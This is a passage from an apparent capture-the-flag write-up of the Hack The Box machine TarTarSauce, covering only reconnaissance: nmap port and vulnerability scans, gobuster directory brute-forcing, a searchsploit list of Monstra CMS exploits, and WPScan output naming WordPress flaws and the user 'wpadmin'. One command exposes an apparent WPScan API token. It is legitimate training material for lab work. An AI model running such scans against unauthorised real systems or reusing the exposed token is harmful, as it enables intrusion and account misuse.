# Hackthebox TarTarSauce

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.129.1.185     
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 08:46 EST
Nmap scan report for 10.129.1.185
Host is up (0.032s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```

Directory scanning

```
$ gobuster dir -u http://10.129.1.185 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.185
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/03 08:46:52 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 10766]
/robots.txt           (Status: 200) [Size: 208]  
/server-status        (Status: 403) [Size: 300]  
/webservices          (Status: 301) [Size: 318] [--> http://10.129.1.185/webservices/]
```

/webservices/monstra-3.0.4/ is a home for our new Monstra powered website, that does not seem to be much configured yet.

Further enumerating directory tree

```
$ gobuster dir -u http://10.129.1.185/webservices/monstra-3.0.4/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50 -x sh,txt,php,tar
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.185/webservices/monstra-3.0.4/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,txt,php,tar
[+] Timeout:                 10s
===============================================================
2022/01/03 14:11:07 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 317]
/.htaccess.php        (Status: 403) [Size: 326]
/.gitignore           (Status: 200) [Size: 518]
/.htaccess.tar        (Status: 403) [Size: 326]
/.hta.sh              (Status: 403) [Size: 320]
/.htaccess.sh         (Status: 403) [Size: 325]
/.hta.txt             (Status: 403) [Size: 321]
/.htaccess.txt        (Status: 403) [Size: 326]
/.hta.php             (Status: 403) [Size: 321]
/.htaccess            (Status: 403) [Size: 322]
/.hta.tar             (Status: 403) [Size: 321]
/admin                (Status: 301) [Size: 338] [--> http://10.129.1.185/webservices/monstra-3.0.4/admin/]
/.htpasswd            (Status: 403) [Size: 322]                                                           
/.htpasswd.sh         (Status: 403) [Size: 325]                                                           
/.htpasswd.txt        (Status: 403) [Size: 326]                                                           
/backups              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/backups/]
/.htpasswd.php        (Status: 403) [Size: 326]                                                             
/.htpasswd.tar        (Status: 403) [Size: 326]                                                             
/boot                 (Status: 301) [Size: 337] [--> http://10.129.1.185/webservices/monstra-3.0.4/boot/]   
/engine               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/engine/] 
/favicon.ico          (Status: 200) [Size: 1150]                                                            
/index.php            (Status: 200) [Size: 4366]                                                            
/index.php            (Status: 200) [Size: 4366]                                                            
/libraries            (Status: 301) [Size: 342] [--> http://10.129.1.185/webservices/monstra-3.0.4/libraries/]
/plugins              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/plugins/]  
/public               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/public/]   
/robots.txt           (Status: 200) [Size: 92]                                                                
/robots.txt           (Status: 200) [Size: 92]                                                                
/rss.php              (Status: 200) [Size: 1039]                                                              
/sitemap.xml          (Status: 200) [Size: 730]                                                               
/storage              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/storage/]  
/tmp                  (Status: 301) [Size: 336] [--> http://10.129.1.185/webservices/monstra-3.0.4/tmp/] 
```


```
$ gobuster dir -u http://10.129.1.185/webservices/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.185/webservices/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/03 11:01:35 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 308]
/.htpasswd            (Status: 403) [Size: 308]
/.hta                 (Status: 403) [Size: 303]
/wp                   (Status: 301) [Size: 321] [--> http://10.129.1.185/webservices/wp/]
```

And there is a wordpress site below /wp, and its admin page /webservices/wp/wp-login.php

## Vulnerability Scanning

Nmap vuln-scan

```
$ nmap --script vuln 10.129.1.185  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 08:49 EST
Nmap scan report for 10.129.1.185
Host is up (0.036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
```


Searchsploit for Monstra

```
$ searchsploit monstra 
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 1.2.0 - 'login' SQL Injection                                                                                 | php/webapps/38769.txt
Monstra CMS 1.2.1 - Multiple HTML Injection Vulnerabilities                                                               | php/webapps/37651.html
Monstra CMS 3.0.3 - Multiple Vulnerabilities                                                                              | php/webapps/39567.txt
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution                                         | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                                                             | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                                                                   | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                                                                        | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                                                                 | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                                                            | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                                                            | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                                                        | php/webapps/45164.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

WPScan for WordPress

```
$ wpscan --url 10.129.1.185/webservices/wp --api-token r9smSzG4RwsgpvPuUBsf1E6r90zJ14CSNgDOgPgorF4     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.129.1.185/webservices/wp/ [10.129.1.185]
[+] Started: Mon Jan  3 11:22:26 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.129.1.185/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.129.1.185/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.129.1.185/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.129.1.185/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.129.1.185/webservices/wp/, Match: 'WordPress 4.9.4'
 |
 | [!] 33 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.9.11
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 4.9.17
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.9.18
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.
```

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wpadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


In addition the author name can be queried by calling a url 

```
http://10.129.1.185/webservices/wp/?author=1
```

It seems the plugins need to be queried using aggressive mode to detect what is installed

```
$ wpscan --url 10.129.1.185/webservices/wp --enumerate p --plugins-detection aggressive

...

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:10 <===============================================================> (1500 / 1500) 100.00% Time: 00:00:10
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-10-01T18:28:00.000Z
 | Readme: http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/readme.txt
